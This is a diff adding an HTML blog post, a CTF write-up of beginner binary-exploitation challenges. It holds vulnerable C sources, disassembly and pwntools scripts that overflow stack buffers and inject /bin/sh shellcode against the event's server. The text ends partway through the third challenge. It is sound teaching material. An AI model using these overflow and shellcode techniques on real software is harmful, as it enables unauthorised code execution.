@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>TAMU Cybersecurity Club Pwn CTF 2020</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn1">pwn1</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn2">pwn2</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#shellcode">shellcode</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn3">pwn3</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn4">pwn4</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#leaking-libc-address">leaking libc address</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#exploiting-with-libc">exploiting with libc</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#putting-it-together">putting it together</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn5">pwn5</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#pwn6">pwn6</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#a-little-background-on-the-got">a little background on the GOT</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#how-do-we-take-advantage-of-this-to-exploit">how do we take advantage of this to exploit?</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#actually-using-the-n-format-specifier">actually using the %n format specifier</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/tamu-pwn-ctf-2020/#the-actual-exploit">the actual exploit</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>TAMU Cybersecurity Club Pwn CTF 2020</h1>
+    </header>
+
+    <div class="content">
+        <p>In November 2020 I put on a small CTF themed around binary exploitation for Texas A&amp;M students and it's now over so sources and writeups are published.  Challenge sources are available at <a href="https://github.com/tamucybersec/pwn-ctf-2020">tamucybersec/pwn-ctf-2020</a>.</p>
+<span id="continue-reading"></span><h2 id="pwn1">pwn1</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec chall
+</span><span>[*] &#39;/home/sky/Documents/binex/variable_overwrite/chall&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdio.h&gt;
+</span><span style="color:#ffa759;">#include </span><span style="color:#bae67e;">&lt;stdlib.h&gt;
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">int</span><span> can_read_flag </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> name[</span><span style="color:#ffcc66;">64</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Enter your name: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">gets</span><span>(name)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(can_read_flag </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0x1</span><span>){
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Hi </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>name)</span><span style="color:#ccc9c2cc;">;
+</span><span>		FILE </span><span style="color:#f29e74;">*</span><span>f</span><span style="color:#ccc9c2cc;">;
+</span><span>		f </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">fopen</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;r&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(f </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">NULL</span><span>){
+</span><span>			</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt doesn&#39;t exist, try again on the server&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			</span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>		</span><span style="color:#ffa759;">char</span><span> flag[</span><span style="color:#ffcc66;">0x32</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#f28779;">fgets</span><span>(flag</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x32</span><span style="color:#ccc9c2cc;">,</span><span>f)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%s</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>flag)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#f28779;">fflush</span><span>(stdout)</span><span style="color:#ccc9c2cc;">;
+</span><span>	} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Sorry, you aren&#39;t authorized!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>}
+</span></code></pre>
+<p>We've got a few extra variables in the stack which shift the organization around a bit so we can't just offset our payload by 64.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>[0x000010c0]&gt; pdf@main
+</span><span>            ; DATA XREF from entry0 @ 0x10dd
+</span><span>┌ 248: int main (int argc, char **argv, char **envp);
+</span><span>│           ; var char *var_90h @ rbp-0x90
+</span><span>│           ; var char *s @ rbp-0x50
+</span><span>│           ; var file*stream @ rbp-0x10
+</span><span>│           ; var uint32_t var_4h @ rbp-0x4
+</span><span>...
+</span><span>│           0x000011e6      488d45b0       lea rax, [s]
+</span><span>│           0x000011ea      4889c7         mov rdi, rax                ; char *s
+</span><span>│           0x000011ed      b800000000     mov eax, 0
+</span><span>│           0x000011f2      e869feffff     call sym.imp.gets           ; char *gets(char *s)
+</span><span>│           0x000011f7      837dfc01       cmp dword [var_4h], 1
+</span><span>│       ┌─&lt; 0x000011fb      0f8589000000   jne 0x128a
+</span><span>│       │   0x00001201      488d45b0       lea rax, [s]
+</span><span>...
+</span></code></pre>
+<p>The address of our can_read_flag variable is <code>$rbp-0x4</code> and the address we're writing to (s) is <code>$rbp-0x50</code>.  <code>0x50-0x4 = 76</code> which means we need to write 76 bytes before we start overflowing into can_read_flag.  It's also worth noting that we need to write binary 0x00000001 and not the ascii value "1" (which is 0x31).  To do this we can use the pwntools function <code>p32</code> which packs an integer into a 32 bit bytestring.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>log_level </span><span style="color:#f29e74;">= </span><span>logging</span><span style="color:#f29e74;">.</span><span>ERROR
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span>]
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.cybr.club&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2000</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">76 </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span><span>
+</span></code></pre>
+<p>flag: <code>FLAG{v4r14bl3_0v3rwr173_cea492}</code></p>
+<h2 id="pwn2">pwn2</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec chall
+</span><span>[*] &#39;/home/sky/Documents/binex/stack_exec/chall&#39;
+</span><span>    Arch:     i386-32-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX disabled
+</span><span>    PIE:      PIE enabled
+</span><span>    RWX:      Has RWX segments
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>#include &lt;stdio.h&gt;
+</span><span>#include &lt;stdlib.h&gt;
+</span><span>
+</span><span>
+</span><span>int vuln() {
+</span><span>	char data[128];
+</span><span>	printf(&quot;What would you like to store in memory today (%x)?\n&quot;, &amp;data);
+</span><span>	gets(data);
+</span><span>}
+</span><span>
+</span><span>int main(){
+</span><span>	setvbuf(stdout, NULL, _IONBF, 0);
+</span><span>	vuln();
+</span><span>}
+</span></code></pre>
+<p>NX is off which means that we can execute instructions on the stack and the program very kindly tells us the location we're writing to.  Our goal here is to write shellcode onto the stack and then overwrite the return pointer to the address we received earlier.</p>
+<h3 id="shellcode">shellcode</h3>
+<p>Wikipedia says</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>In hacking, a shellcode is a small piece of code used as the payload in the exploitation of a software vulnerability. It is called &quot;shellcode&quot; because it typically starts a command shell from which the attacker can control the compromised machine, but any piece of code that performs a similar task can be called shellcode. Because the function of a payload is not limited to merely spawning a shell, some have suggested that the name shellcode is insufficient.[1] However, attempts at replacing the term have not gained wide acceptance. Shellcode is commonly written in machine code. 
+</span></code></pre>
+<p>What we're going to be using is linux amd64 instructions which execute <code>execve("/bin/sh")</code>.  I use pwntools to generate this for me but <a href="http://shell-storm.org/shellcode/">shell-storm</a> is also a good resource.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>log_level </span><span style="color:#f29e74;">= </span><span>logging</span><span style="color:#f29e74;">.</span><span>ERROR
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./chall&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span>]
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ctf.cybr.club&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2001</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>    stack_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="background-color:#ffa759;color:#ffffff;">\(</span><span style="color:#bae67e;">(.*)</span><span style="background-color:#ffa759;color:#ffffff;">\)</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">readline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>(</span><span style="color:#bae67e;">&#39;ascii&#39;</span><span>))</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">asm</span><span>(shellcraft</span><span style="color:#f29e74;">.</span><span>i386</span><span style="color:#f29e74;">.</span><span>linux</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sh</span><span>())
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span>(</span><span style="color:#ffcc66;">140 </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(payload)) </span><span style="font-style:italic;color:#5c6773;"># fill data buffer
+</span><span>    payload </span><span style="color:#f29e74;">+= </span><span style="color:#ffd580;">p32</span><span>(stack_addr)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat flag.txt;exit;&quot;</span><span>)
+</span><span>    </span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(FLAG{.*})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<p>flag: <code>FLAG{3x3cu74bl3_574ck_11d512}</code></p>
+<h2 id="pwn3">pwn3</h2>
+<p>We don't get challenge sources on pwn3 so its time to learn to love reversing.  I'll be using <a href="https://ghidra-sre.org/">Ghidra</a> to reverse these.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec chall
+</span><span>[*] &#39;/home/sky/Documents/binex/rop_win/chall&#39;
+</span><span>    Arch:     i386-32-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      No PIE (0x8048000)
+</span></code></pre>
+<p><img src="/ctf/tamu-pwn-ctf-2020/pwn3_functions_list.png" alt="" /></p>
+<p>Well, that sure looks suspicious.  We have a read_flag function which we should keep note of but also <code>unlock_one</code>, <code>unlock_two</code>, and <code>unlock_three</code>.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">read_flag</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">char</span><span> local_42 [</span><span style="color:#ffcc66;">50</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  FILE </span><span style="color:#f29e74;">*</span><span>local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#ffa759;">if </span><span>((((file_found </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(unlocked_one </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>)) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(unlocked_two </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>)) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(unlocked_three </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>))
+</span><span>  {
+</span><span>    local_10 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">fopen</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;r&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">if </span><span>(local_10 </span><span style="color:#f29e74;">== </span><span>(FILE </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span>) {
+</span><span>      </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;flag.txt doesn</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t exist, try again on the server&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>      </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>    }
+</span><span>    </span><span style="color:#f28779;">fgets</span><span>(local_42</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x32</span><span style="color:#ccc9c2cc;">,</span><span>local_10)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(local_42)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">fflush</span><span>(stdout)</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;You aren</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t allowed to read the flag!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>Looks like we get the flag if four global variables are set to true.</p>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">unlock_one</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  iVar1 </span><span style="color:#f29e74;">=</span><span> __x86</span><span style="color:#f29e74;">.</span><span>get_pc_thunk</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ax</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)(iVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x2d52</span><span>) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">unlock_two</span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  iVar1 </span><span style="color:#f29e74;">=</span><span> __x86</span><span style="color:#f29e74;">.</span><span>get_pc_thunk</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ax</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(param_1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0x12345678</span><span>) {
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)(iVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x2d3c</span><span>) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">unlock_three</span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">param_1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">param_2</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  iVar1 </span><span style="color:#f29e74;">=</span><span> __x86</span><span style="color:#f29e74;">.</span><span>get_pc_thunk</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">ax</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>((param_1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0x1e9c66e6</span><span>) </span><span style="color:#f29e74;">&amp;&amp; </span><span>(param_2 </span><span style="color:#f29e74;">== -</span><span style="color:#ffcc66;">0x5250edee</span><span>)) {
+</span><span>    </span><span style="color:#f29e74;">*</span><span>(undefined4 </span><span style="color:#f29e74;">*</span><span>)(iVar1 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x2d1d</span><span>) </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">find_file</span><span>(</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">param_1</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  iVar1 </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">strcmp</span><span>(param_1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;flag.txt&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(iVar1 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    file_found </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So we have four functions which we need to call with controlled arguments.  This is a 32-bit binary so all we need to control is the stack.  Fortunately, there is a trivial buffer overflow.</p>
